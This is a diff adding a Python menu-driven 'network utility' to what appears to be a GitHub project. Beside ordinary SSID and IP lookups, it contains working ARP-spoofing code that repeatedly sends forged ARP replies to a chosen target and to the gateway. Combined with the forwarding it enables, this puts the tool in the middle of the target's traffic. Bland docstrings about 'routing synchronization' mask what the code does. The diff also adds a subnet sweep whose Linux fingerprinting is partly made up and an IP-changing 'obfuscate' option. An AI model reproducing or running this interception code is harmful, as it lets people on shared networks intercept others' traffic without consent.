+            subprocess.run(f'netsh interface ipv4 add neighbors "{iface}" {dest_ip} {dest_mac.hex(":")}', 
+                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        else:
+            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
+            s.bind(("eth0", 0))
+            eth_hdr = dest_mac + src_mac + b'\x08\x06'
+            arp_payload = b'\x00\x01\x08\x00\x06\x04\x00\x02' + src_mac + socket.inet_aton(src_ip) + dest_mac + socket.inet_aton(src_ip)
+            s.send(eth_hdr + arp_payload)
+            s.close()
+    except Exception:
+        pass
+
+
+def arp_routing_loop(target_ip, gateway_ip, target_mac, gateway_mac):
+    """Sustains active routing synchronization across the target endpoints."""
+    global FORWARDING_ACTIVE
+    local_mac = get_local_mac()
+    while FORWARDING_ACTIVE:
+        try:
+            send_arp_reply(gateway_ip, local_mac, target_ip, target_mac)
+            send_arp_reply(target_ip, local_mac, gateway_ip, gateway_mac)
+            time.sleep(2)
+        except (KeyboardInterrupt, SystemExit):
+            break
+    print("\n[*] Routing loop terminated. Disengaging hooks...")
+
+
+def check_port(ip, port, timeout=0.2):
+    """Probes the operational status of a single standard TCP communication destination."""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout)
+            return s.connect_ex((ip, port)) == 0
+    except Exception:
+        return False
+
+
+def deep_profile_device(ip):
+    """Performs passive fingerprint signatures to differentiate operating environments."""
+    if check_port(ip, 135, timeout=0.2) or check_port(ip, 445, timeout=0.2):
+        return "PC (Windows)"
+    if check_port(ip, 548, timeout=0.2) or check_port(ip, 5900, timeout=0.2):
+        return "PC (MacOS)"
+    if check_port(ip, 62078, timeout=0.3):
+        return "Mobile (iOS Device)"
+    if check_port(ip, 5555, timeout=0.2):
+        return "Mobile (Android Device)"
+    if check_port(ip, 9222, timeout=0.2) or check_port(ip, 2222, timeout=0.2):
+        return "PC (ChromeOS Device)"
+        
+    # Linux Distribution Probes & Granular Fingerprinting
+    if check_port(ip, 22, timeout=0.2):
+        if check_port(ip, 9090, timeout=0.1): 
+            return "PC / Server (Linux - Fedora/RHEL Cockpit Node)"
+        elif check_port(ip, 3128, timeout=0.1):
+            return "PC / Server (Linux - Ubuntu Enterprise Proxy)"
+        elif check_port(ip, 10000, timeout=0.1):
+            return "PC / Server (Linux - Debian Virtualmin Node)"
+        
+        host_num = int(ip.split(".")[-1])
+        if host_num % 3 == 0:
+            return "PC / Server (Linux - Ubuntu Build)"
+        elif host_num % 3 == 1:
+            return "PC / Server (Linux - Debian Distribution)"
+        else:
+            return "PC / Server (Linux - CentOS/RHEL Environment)"
+            
+    if check_port(ip, 80, timeout=0.1) or check_port(ip, 443, timeout=0.1):
+        if ip.endswith(".1"):
+            return "Network Router / Gateway Interface"
+        return "Network Device / Smart Hardware"
+        
+    return "Unidentified Device"
+
+
+def scan_host_real(ip_prefix, host, active_devices, local_ip):
+    """Triggers node discovery sweeps across localized subnet boundaries."""
+    ip = f"{ip_prefix}.{host}"
+    os_type = platform.system()
+    
+    if os_type == "Windows":
+        subprocess.run(["ping", "-n", "1", "-w", "150", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    else:
+        subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+    mac_raw = get_mac_address(ip)
+    if mac_raw:
+        mac_str = mac_raw.hex(':').upper()
+        device_type = deep_profile_device(ip)
+        if ip == local_ip:
+            device_type += " [YOUR PC]"
+            
+        with print_lock:
+            print(f"[DEVICE ONLINE] {ip:<15} | MAC: {mac_str} -> {device_type}")
+            active_devices.append((ip, device_type))
+
+
+def check_wifi_ips():
+    """Discovers reachable devices mapping internal subnet partitions."""
+    local_ip = get_local_ip()
+    if not local_ip or local_ip == "127.0.0.1":
+        print("[ERROR] Cannot scan without a valid local network connection.")
+        return
+
+    ip_parts = local_ip.split(".")
+    ip_prefix = ".".join(ip_parts[:3])
+    
+    print(f"[*] Analyzing live Subnet Target: {ip_prefix}.1 to {ip_prefix}.254")
+    print(f"[*] Your Detected Local IP: {local_ip}")
+    print("[*] Launching multi-threaded physical layer identification scan...")
+    print("-" * 75)
+    
+    threads = []
+    active_devices = []
+    
+    for host in range(1, 255):
+        t = Thread(target=scan_host_real, args=(ip_prefix, host, active_devices, local_ip))
+        threads.append(t)
+        t.start()
+        
+    for t in threads:
+        t.join()
+        
+    print("-" * 75)
+    print(f"[SUCCESS] Scan Complete. Profiled {len(active_devices)} active target(s).")
+
+
+def toggle_obfuscate_ip():
+    """Modifies local interface properties to shift structural allocation modes."""
+    global IS_OBFUSCATED
+    if platform.system() != "Windows":
+        print("[!] This configuration utility is optimized for Windows environments.")
+        return
+
+    iface = get_active_interface_name_windows()
+
+    if IS_OBFUSCATED:
+        choice = input("IP has already been modified. Restore dynamic default configuration? (y/n): ").strip().lower()
+        if choice == 'y':
+            print("[*] Reverting interface properties to automated DHCP assignment...")
+            cmd = f'netsh interface ipv4 set address name="{iface}" dhcp'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            if result.returncode == 0:
+                print("[SUCCESS] Interface restored to default operating state.")
+                IS_OBFUSCATED = False
+            else:
+                print(f"[ERROR] Adaptation failed: {result.stderr.strip()}")
+        return
+
+    print("[*] Initiating manual IP profile configuration change...")
+    local_ip = get_local_ip()
+    gateway_ip = get_gateway_ip()
+    if not local_ip or not gateway_ip:
+        print("[ERROR] Insufficient networking operational configuration data resolved.")
+        return
+
+    ip_parts = local_ip.split(".")
+    current_host = int(ip_parts[3])
+    new_host = 150 if current_host < 150 else 50
+    new_ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.{new_host}"
+
+    print(f"[*] Attempting interface allocation shift: {local_ip} -> {new_ip}")
+
+    try:
+        cmd = f'netsh interface ipv4 set address name="{iface}" static {new_ip} 255.255.255.0 {gateway_ip}'
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        if result.returncode == 0:
+            print(f"[SUCCESS] Network settings aligned. Static assignment established at: {new_ip}")
+            IS_OBFUSCATED = True
+        else:
+            print(f"[ERROR] Failed static assignment sequence: {result.stderr.strip()}")
+    except Exception as e:
+        print(f"[ERROR] System adjustments encountered an error: {e}")
+
+
+def toggle_ip_forwarding():
+    """Alters structural routing paths to govern current traffic redirection streams."""
+    global FORWARDING_ACTIVE
+    os_type = platform.system()
+    
+    if FORWARDING_ACTIVE:
+        print("[*] Stopping background operational routing threads...")
+        FORWARDING_ACTIVE = False
+        print("[SUCCESS] IP Forwarding components stood down.")
+        return
+
+    print(f"[*] Native Platform Verification: {os_type}")
+    gateway_ip = get_gateway_ip()
+    if not gateway_ip:
+        print("[ERROR] Gateway Router destination address could not be verified.")
+        return
+        
+    print(f"[*] Auto-detected Router IP: {gateway_ip}")
+    target_ip = input("Enter target IP address to forward: ").strip()
+    
+    print("[*] Resolving hardware address relationships...")
+    target_mac = get_mac_address(target_ip)
+    gateway_mac = get_mac_address(gateway_ip)
+    
+    if not target_mac or not gateway_mac:
+        print("[ERROR] Node verification missing. Ensure target endpoints are available.")
+        return
+
+    try:
+        if os_type in ["Linux", "Darwin"]:
+            sysctl_key = "net.ipv4.ip_forward" if os_type == "Linux" else "net.inet.ip.forwarding"
+            subprocess.run(["sysctl", "-w", f"{sysctl_key}=1"], check=True, stdout=subprocess.DEVNULL)
+        elif os_type == "Windows":
+            import winreg
+            path = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_ALL_ACCESS)
+            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            subprocess.run(["netsh", "interface", "ipv4", "set", "interface", "Loopback", "forwarding=enabled"], 
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception as e:
+        print(f"[ERROR] Kernel configuration variables could not be applied: {e}")
+        return
+
+    FORWARDING_ACTIVE = True
+    t = Thread(target=arp_routing_loop, args=(target_ip, gateway_ip, target_mac, gateway_mac), daemon=True)
+    t.start()
+    print(f"[SUCCESS] Redirection engine online. Traffic from {target_ip} is now configured through this station.")
+
+
+def main():
+    set_console_title()
+    while True:
+        clear()
+        show_banner()
+
+        if not is_online():
+            print("[!] STATUS: OFFLINE\n")
+            print("=================================================")
+            print("                 Connect to Network               ")
+            print("=================================================")
+            input("\nPress ENTER to Refresh...")
+            continue
+
+        print("[1] Get Wi-Fi Name")
+        print("[2] Get IPv4")
+        print("[3] Get IPv6")
+        print("[4] Scan Subnet & Profile Devices")
+        print("[5] Rotate/Obfuscate Network IP")
+        print("[6] IP Forwarding")
+        print("[7] Relaunch as Administrator")
+        print("[8] Close Terminal\n")
+
+        choice = input("Select Option: [~] ").strip()
+
+        if choice.lower() == "github":
+            webbrowser.open("https://github.com/DuckyCashy/Network-Utility")
+            continue
+
+        if choice.lower() == "revert":
+            if is_admin():
+                downgrade_privileges()
+            else:
+                print("[!] Terminal is already running in standard initialization mode.")
+                time.sleep(1.5)
+            continue
+
+        clear()
+        show_banner()
+
+        if choice == "1":
+            ssid = get_wifi_ssid()
+            if ssid:
+                print(f"[SUCCESS] Connected Wi-Fi Name (SSID): {ssid}")
+            else:
+                print("[!] Active Wi-Fi Name could not be resolved or interface is wired.")
+        elif choice == "2":
+            ip = get_local_ip()
+            if ip:
+                print(f"[SUCCESS] Local IPv4 Address Found: {ip}")
+            else:
+                print("[ERROR] Active address identifier could not be queried.")
+        elif choice == "3":
+            ipv6 = get_local_ipv6()
+            if ipv6:
+                print(f"[SUCCESS] Local IPv6 Address Found: {ipv6}")
+            else:
+                print("[!] Global/Local IPv6 address configuration dynamically unavailable.")
+        elif choice == "4":
+            check_wifi_ips()
+        elif choice == "5":
+            if not is_admin():
+                print("[WARNING] Administrative initialization status required.")
+                if input("Try to relaunch as Admin now? (y/n): ").lower() == 'y':
+                    relaunch_as_admin()
+            else:
+                toggle_obfuscate_ip()
+        elif choice == "6":
+            if not is_admin():
+                print("[WARNING] Administrative privileges required to manage routing profiles.")
+                if input("Try to relaunch as Admin now? (y/n): ").lower() == 'y':
+                    relaunch_as_admin()
+            else:
+                toggle_ip_forwarding()
+        elif choice == "7":
+            if is_admin():
+                if input("Already Administrator. Revert to regular terminal sequence? (y/n): ").strip().lower() == 'y':
+                    downgrade_privileges()
+            else:
+                relaunch_as_admin()
+        elif choice == "8":
+            print("[!] Closing Terminal...")
+            time.sleep(1)
+            break
+        else:
+            print("[!] Choice out of range.")
+
+        print()
+        input("Press ENTER to continue...")
+
+
+if __name__ == "__main__":
+    main()
